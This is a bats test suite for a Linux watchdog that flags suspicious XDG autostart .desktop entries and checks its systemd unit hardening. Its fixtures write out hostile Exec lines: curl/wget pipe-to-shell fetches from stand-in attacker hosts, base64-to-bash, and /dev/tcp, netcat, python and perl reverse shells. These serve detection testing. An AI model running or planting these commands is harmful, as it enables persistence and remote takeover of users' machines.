#!/usr/bin/env bats
# L2 bats functional tests for the xdg-autostart-watchdog scan script.
#
# A .desktop file in an autostart dir runs its `Exec=` at the start of every
# desktop session (root's session for /root/.config/autostart, every
# session for /etc/xdg/autostart) — a login/session persistence vector. An
# Exec under a writable root, relative-with-slash, or carrying an injection
# pattern is alert; bare PATH-resolved commands are normal.
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# autostart dir in a tmp sandbox via SELFDEF_XDG_DIRS.
#
# Run with: bats packaging/test/L2-xdg-autostart-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd/xdg-autostart-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    AUTOD="${TMP}/autostart"; mkdir -p "${AUTOD}"
    DESK="${AUTOD}/app.desktop"
}

teardown() { rm -rf "${TMP}"; }

desktop() { printf '[Desktop Entry]\nType=Application\nName=App\nExec=%s\n' "$1"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_XDG_PROFILE="${PROFILE:-report}" \
    SELFDEF_XDG_BASELINE="${BASELINE}" \
    SELFDEF_XDG_DIRS="${DIRS:-$AUTOD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no autostart dirs → ok / no_autostart_dirs" {
    DIRS="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_autostart_dirs"'
    cap | grep -q '"severity":"ok"'
}

@test "benign autostart entry, first run → ok / baseline_initial" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / xdg_autostart_intact" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xdg_autostart_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "Exec under a writable root → alert / xdg_autostart_suspicious" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd                                   # benign baseline
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xdg_autostart_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "Exec carrying a curl|sh payload → alert" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'sh -c "curl http://evil|sh"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a relative-with-slash Exec → alert" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop ./rel/x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign Exec change → warn / xdg_autostart_changed" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /usr/bin/blueman-applet > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"xdg_autostart_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "a /usr/bin Exec is NOT flagged" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a bare PATH-resolved Exec is NOT flagged" {
    desktop 'pulseaudio --start' > "${DESK}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    desktop /usr/bin/nm-applet > "${DESK}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious Exec" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — xdg-autostart inventory enumerates per-session exec surface)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (Exec under /var/tmp): writable-root expansion" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /var/tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (Exec under /dev/shm): tmpfs writable-root coverage" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /dev/shm/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (reverse-shell pattern in Exec)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in Exec)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'sh -c "wget -qO- http://attacker/p | sh"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in Exec)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'sh -c "echo YmFzaCAtaQ== | base64 -d | bash"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable .desktop file → alert)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    chmod 0666 "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-xdg-autostart -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no-auto-trust: xdg-autostart-watchdog does NOT refresh baseline on suspicious-Exec detection — alert STAYS until operator updates)" {
    # Login/session persistence primitive — alert MUST persist
    # across runs until operator explicitly re-baselines. Sister to
    # sshd-config, sudo-conf, gss-mech, ld-preload, nm-vpn-plugin,
    # openvpn-config — active-injection class never auto-trusts.
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: a second autostart dir ALSO scanned — both /etc/xdg/autostart + ~/.config/autostart)" {
    # xdg-autostart consults BOTH /etc/xdg/autostart (system) and
    # ~/.config/autostart (per-user). Both may carry attacker-planted
    # .desktop files — watchdog must enumerate every dir in
    # SELFDEF_XDG_DIRS.
    AUTOD2="${TMP}/autostart.user"; mkdir -p "${AUTOD2}"
    desktop /usr/bin/nm-applet > "${DESK}"
    DIRS="${AUTOD} ${AUTOD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    desktop /tmp/user-evil > "${AUTOD2}/user-app.desktop"
    DIRS="${AUTOD} ${AUTOD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant in Exec — sister to wget-pipe-sh axis)" {
    # Attacker may swap wget→curl and sh→bash. Both downloader-
    # tool and shell variants must trigger.
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'bash -c "curl -fsSL http://attacker/p | bash"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (Exec under /home: user-writable hijack coverage)" {
    # Operator's home dir is a writable-root variant. Symmetric to
    # /tmp + /var/tmp + /dev/shm axes already locked.
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /home/user/evil > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in Exec: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANTs across the brain. XDG autostart .desktop entries
    # are run on every graphical login by every user (and per-
    # user autostart by the user's own login). T1547.013 — XDG
    # Autostart Entries; recurring trigger fires once per
    # graphical login session, and on a multi-user host that's
    # multiple times per day.
    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Desktop Entry]\nType=Application\nExec=nc -e /bin/sh 1.1.1.1 4444\n' > "${AUTOD}/evil.desktop"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on XDG autostart surface)" {
    # Sister to nc / curl|bash / dev-tcp XDG autostart variants.
    # Python on every Debian/Ubuntu desktop. Locks python axis on
    # T1547.013 XDG Autostart per-graphical-login persistence.
    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Desktop Entry]\nType=Application\nExec=python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${AUTOD}/evil.desktop"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on XDG autostart surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp XDG
    # autostart variants. Perl on every Debian/Ubuntu desktop.
    # Locks perl axis on T1547.013 XDG Autostart per-graphical-
    # login persistence — runs AS user on every desktop session
    # start.
    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Desktop Entry]\nType=Application\nExec=perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${AUTOD}/evil.desktop"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on xdg-autostart surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The xdg-autostart-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1547.013 XDG Autostart per-graphical-login
    # persistence alert. Locks parser contract on the .desktop
    # Exec= detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
    run_wd                                              # ok path
    printf '[Desktop Entry]\nType=Application\nExec=/tmp/.evil\n' > "${AUTOD}/evil.desktop"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: xdg-autostart-watchdog NEVER deletes .desktop entries — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # xdg-autostart-watchdog DETECTS T1547.013 XDG Autostart
    # per-graphical-login persistence but MUST NEVER emit rm/
    # unlink commands to auto-clean the .desktop file. The
    # detected entry may be operator-legitimate (custom session
    # startup tool, screen-lock helper, notification daemon).
    # Silent auto-delete would destroy operator baseline state
    # AND could break operator's daily desktop workflow.
    # Surveillance, never remediation. Locks anti-data-loss
    # contract on the xdg-autostart surveillance substrate.
    printf '[Desktop Entry]\nType=Application\nExec=/tmp/.evil\n' > "${AUTOD}/evil.desktop"
    run_wd
    [ -f "${AUTOD}/evil.desktop" ]
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(AUTOD|FILE|file)'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # xdg-autostart-watchdog runs ON the timer's scheduled fire
    # — scans /etc/xdg/autostart + per-user ~/.config/autostart
    # for Exec= injection patterns in .desktop entries, emits a
    # verdict, then exits. Type=simple would break timer
    # OnUnitActiveSec semantics. Locks oneshot-probe contract on
    # the xdg-autostart-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd/selfdef-xdg-autostart.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. xdg-autostart-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # xdg-autostart-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # xdg-autostart-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'xdg-autostart-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: xdg-autostart-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. xdg-autostart-watchdog is a DETECT-only watchdog: surveils +
    # emits verdicts, NEVER writes back. Locks no-auto-fix on
    # the xdg-autostart-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (xdg-autostart-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the xdg-autostart-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (xdg-autostart-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # xdg-autostart-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (xdg-autostart-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # xdg-autostart-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (xdg-autostart-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the xdg-autostart-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (xdg-autostart-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # xdg-autostart-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (xdg-autostart-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. Locks the service-to-libexec binding discipline
    # on the xdg-autostart-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (xdg-autostart-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # Locks anti-restart-storm discipline on the xdg-autostart-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Locks Description-present discipline on the
    # xdg-autostart-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the xdg-autostart-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the xdg-autostart-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the xdg-autostart-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the xdg-autostart-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog service unit declares NoNewPrivileges=true — privilege-escalation containment contract)" {
    # Sister to brain-wide systemd NoNewPrivileges= INVARIANT
    # family. The NoNewPrivileges=true directive instructs
    # the kernel to set PR_SET_NO_NEW_PRIVS on the watchdog
    # process — any subsequent execve() in the watchdog
    # script (sha256sum, awk, etc.) is forbidden to acquire
    # NEW privileges via setuid/setgid/file-capabilities. An
    # exploited watchdog cannot escalate via a setuid helper
    # (e.g. /usr/bin/su, /usr/bin/sudo). A regression
    # dropping NoNewPrivileges= would leave the watchdog
    # exposed to setuid-binary pivot. Locks the privilege-
    # escalation containment discipline on the xdg-autostart-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^NoNewPrivileges=true' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog service unit declares ReadWritePaths= — explicit-strict-mode-permitted-writes manifest contract)" {
    # Sister to brain-wide systemd ReadWritePaths= INVARIANT
    # family. Watchdog .service units run under ProtectSystem=
    # strict which forbids ALL writes to /etc, /usr, /boot —
    # the unit can ONLY write to paths explicitly enumerated
    # in ReadWritePaths=. Watchdog scripts MUST write to at
    # least /dev/log (logger(1) channel) + the canonical
    # selfdef state dir. A regression dropping ReadWritePaths=
    # would surface as EROFS at logger() call. Locks the
    # explicit-allowlist write-paths discipline on the xdg-autostart-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ReadWritePaths=' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog service unit ExecStart references /usr/local/libexec/selfdef/ — operator-extension binary-path canonical contract)" {
    # Sister to brain-wide systemd ExecStart binary-path
    # INVARIANT family. Watchdog .service units MUST execute
    # the watchdog script from /usr/local/libexec/selfdef/
    # (operator-extension path, not /usr/bin which is
    # Debian-package-only). The canonical libexec/selfdef/
    # path lets operators override the watchdog script
    # without rebuilding the .deb (sister to brain-wide
    # operator-extension /usr/local/* discipline). A
    # regression that pointed ExecStart at /usr/bin/ would
    # surface as a "stale-watchdog-binary" on hosts where
    # operators patched the libexec copy. Locks the
    # libexec/selfdef ExecStart-path discipline on the
    # xdg-autostart-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog service unit declares After= ordering directive — boot-sequencing contract)" {
    # Sister to brain-wide systemd After= INVARIANT family.
    # Watchdog .service units MUST declare an After= directive
    # so they don't fire before the filesystem mounts that
    # contain their probe targets (canonically After=local-
    # fs.target so /etc/* is mounted before the watchdog
    # tries to sha256sum a config file). A regression
    # dropping After= would surface as "watchdog fires
    # during early-boot before /etc is mounted" which then
    # hashes nothing + emits a spurious "config missing"
    # alert. Locks the boot-sequencing discipline on the
    # xdg-autostart-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^After=' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog service unit declares Documentation= — operator-doc-link canonical contract)" {
    # Sister to brain-wide systemd Documentation= INVARIANT
    # family. Watchdog .service units MUST declare a
    # Documentation= directive pointing operators at the
    # module's README (canonical: https://github.com/
    # cyberpunk042/selfdef modules/<slug>-watchdog/README.md).
    # A regression dropping Documentation= would leave
    # operators triaging journald entries without a direct
    # docs link. Locks the Documentation= operator-doc-link
    # discipline on the xdg-autostart-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=' "${s}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog timer unit declares OnCalendar= — daily-cadence operator-predictable contract)" {
    # Sister to brain-wide systemd OnCalendar= INVARIANT
    # family. Watchdog .timer units MUST declare an
    # OnCalendar= directive (canonically daily at a staggered
    # time per the watchdog ladder so simultaneous-fire
    # thundering-herd is avoided). The operator can predict
    # when each watchdog runs based on the canonical timer
    # schedule. A regression dropping OnCalendar= would
    # leave the watchdog firing ONLY at OnBootSec (no
    # recurring daily cadence). Locks the daily-cadence
    # discipline on the xdg-autostart-watchdog timer substrate.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^OnCalendar=' "${t}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog timer unit declares WantedBy=timers.target — timer-enable-graph contract)" {
    # Sister to brain-wide systemd timer [Install].WantedBy=
    # INVARIANT family. Watchdog .timer units MUST declare
    # WantedBy=timers.target so `systemctl enable selfdef-
    # <slug>.timer` wires the timer into the timers.target
    # symlink-graph + activates it on every boot. A
    # regression that swapped to WantedBy=multi-user.target
    # (the .service-side install target) would make the
    # timer enable-step a no-op + leave the watchdog
    # silently inactive. Locks the timer-enable-graph
    # discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^WantedBy=timers.target' "${t}"
    done
}

@test "INVARIANT (xdg-autostart-watchdog timer unit declares Description= — operator-list-timers identification contract)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Watchdog .timer units MUST declare Description=
    # so operators triaging `systemctl list-timers` output
    # see a human-readable label per timer. Locks the
    # timer-Description discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Description=' "${t}"
    done
}

